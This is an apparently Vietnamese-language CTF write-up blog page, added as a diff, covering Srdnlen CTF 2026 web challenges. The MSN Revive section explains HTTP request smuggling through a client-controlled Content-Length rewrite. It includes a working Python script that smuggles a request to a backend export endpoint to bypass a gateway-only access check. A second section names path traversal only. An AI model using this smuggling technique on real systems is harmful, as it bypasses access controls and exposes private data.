@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="MSN Revive  Ở gateway, route &#x2F;api&#x2F;chat&#x2F;event tự sửa Content-Length dựa vào field nhị phân TotalSize do client điều khiển trong body MSN P2P.   Backend đọc đủ số byte theo Content-Length nhỏ đó, còn ph">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Writeup Srdnlen CTF 2026 Quals [WEB]">
+<meta property="og:url" content="https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/index.html">
+<meta property="og:site_name" content="haonika&#39;s blog">
+<meta property="og:description" content="MSN Revive  Ở gateway, route &#x2F;api&#x2F;chat&#x2F;event tự sửa Content-Length dựa vào field nhị phân TotalSize do client điều khiển trong body MSN P2P.   Backend đọc đủ số byte theo Content-Length nhỏ đó, còn ph">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-03-01T07:37:52.000Z">
+<meta property="article:modified_time" content="2026-03-01T14:29:41.647Z">
+<meta property="article:author" content="Duong Quang Hao">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Writeup Srdnlen CTF 2026 Quals [WEB]</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2026/01/11/uoftctf-2026/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&text=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&title=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&is_video=false&description=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Writeup Srdnlen CTF 2026 Quals [WEB]&body=Check out this article: https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&title=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&title=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&title=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&title=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&name=Writeup Srdnlen CTF 2026 Quals [WEB]&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&t=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSN-Revive"><span class="toc-number">1.</span> <span class="toc-text">MSN Revive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-Shop"><span class="toc-number">2.</span> <span class="toc-text">Double Shop</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Writeup Srdnlen CTF 2026 Quals [WEB]
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Duong Quang Hao</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2026-03-01T07:37:52.000Z" class="dt-published" itemprop="datePublished">2026-03-01</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/ctf/" rel="tag">ctf</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="MSN-Revive"><a href="#MSN-Revive" class="headerlink" title="MSN Revive"></a>MSN Revive</h2>
+
+<p>Ở gateway, route <code>/api/chat/event</code> tự sửa Content-Length dựa vào field nhị phân TotalSize do client điều khiển trong body MSN P2P.</p>
+
+
+<p>Backend đọc đủ số byte theo Content-Length nhỏ đó, còn phần dư bị coi là request HTTP tiếp theo trên cùng kết nối keep-alive.</p>
+<p>Request “smuggled” đó gọi thẳng <code>/api/export/chat</code> ở backend.</p>
+
+
+<p>Check “local access only” chỉ nằm ở gateway, nên request smuggled đi backend sẽ bypass được.</p>
+
+
+<p>Endpoint export ở backend lại không cần login, từ đó đọc được chat chứa flag.</p>
+
+
+<p>Solve</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re                                                                                                                                                     </span><br><span class="line"><span class="keyword">import</span> struct                                                                                                                                                 </span><br><span class="line"><span class="keyword">import</span> requests                                                                                                                                               </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">BASE = <span class="string">&quot;http://msnrevive.challs.srdnlen.it/&quot;</span>                                                                                                                  </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">sid = <span class="string">&quot;00000000-0000-0000-0000-000000000000&quot;</span>                                                                                                                  </span><br><span class="line">json_body = <span class="string">f&#x27;&#123;&#123;&quot;session_id&quot;:&quot;<span class="subst">&#123;sid&#125;</span>&quot;,&quot;format&quot;:&quot;xml&quot;&#125;&#125;&#x27;</span>                                                                                                        </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">smuggled = (                                                                                                                                                  </span><br><span class="line">    <span class="string">&quot;POST /api/export/chat HTTP/1.1\r\n&quot;</span>                                                                                                                      </span><br><span class="line">    <span class="string">&quot;Host: backend\r\n&quot;</span>                                                                                                                                       </span><br><span class="line">    <span class="string">&quot;Content-Type: application/json\r\n&quot;</span>                                                                                                                      </span><br><span class="line">    <span class="string">f&quot;Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(json_body)&#125;</span>\r\n&quot;</span>                                                                                                                   </span><br><span class="line">    <span class="string">&quot;Connection: keep-alive\r\n&quot;</span>                                                                                                                              </span><br><span class="line">    <span class="string">&quot;\r\n&quot;</span>                                                                                                                                                    </span><br><span class="line">    <span class="string">f&quot;<span class="subst">&#123;json_body&#125;</span>&quot;</span>                                                                                                                                            </span><br><span class="line">).encode()                                                                                                                                                    </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">hdr = <span class="built_in">bytearray</span>(<span class="number">48</span>)                 <span class="comment"># fake MSN P2P header                                                                                                     </span></span><br><span class="line">struct.pack_into(<span class="string">&quot;&lt;Q&quot;</span>, hdr, <span class="number">16</span>, <span class="number">0</span>)  <span class="comment"># TotalSize=0 =&gt; forwarded CL=48                                                                                          </span></span><br><span class="line">                                                                                                                                                            </span><br><span class="line">body = <span class="built_in">bytes</span>(hdr) + smuggled                                                                                                                                  </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">s = requests.Session()                                                                                                                                        </span><br><span class="line">                                                                                                                                                            </span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):                                                                                                                                           </span><br><span class="line">    s.post(                                                                                                                                                   </span><br><span class="line">        <span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/api/chat/event&quot;</span>,                                                                                                                             </span><br><span class="line">        data=body,                                                                                                                                            </span><br><span class="line">        headers=&#123;<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-msnmsgrp2p&quot;</span>&#125;,                                                                                                 </span><br><span class="line">        timeout=<span class="number">5</span>,                                                                                                                                            </span><br><span class="line">    )                                                                                                                                                         </span><br><span class="line">                                                                                                                                                            </span><br><span class="line">    <span class="comment"># pull poisoned backend response from connection pool                                                                                                     </span></span><br><span class="line">    r = s.get(<span class="string">f&quot;<span class="subst">&#123;BASE&#125;</span>/api/me&quot;</span>, timeout=<span class="number">5</span>)                                                                                                                    </span><br><span class="line">    m = re.search(<span class="string">r&quot;srdnlen\&#123;[^&#125;]+\&#125;&quot;</span>, r.text)                                                                                                                </span><br><span class="line">    <span class="keyword">if</span> m:                                                                                                                                                     </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;FLAG:&quot;</span>, m.group(<span class="number">0</span>))                                                                                                                            </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Double-Shop"><a href="#Double-Shop" class="headerlink" title="Double Shop"></a>Double Shop</h2><p>App này có chức năng download receipt</p>
+
+
+<p>Path traversal</p>
+
+
+
+
+<p>receipt.png</p>
+
+
+
+<p>……</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Blogs</a></li>
+        
+          <li><a href="/story/">Story</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MSN-Revive"><span class="toc-number">1.</span> <span class="toc-text">MSN Revive</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Double-Shop"><span class="toc-number">2.</span> <span class="toc-text">Double Shop</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&text=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&title=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&is_video=false&description=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Writeup Srdnlen CTF 2026 Quals [WEB]&body=Check out this article: https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&title=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&title=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&title=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&title=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&name=Writeup Srdnlen CTF 2026 Quals [WEB]&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://duonghaonika.github.io/2026/03/01/srdnlen-ctf-2026-quals/&t=Writeup Srdnlen CTF 2026 Quals [WEB]"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2025-2026
+    Duong Quang Hao
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Blogs</a></li><!--
+     --><!--
+       --><li><a href="/story/">Story</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
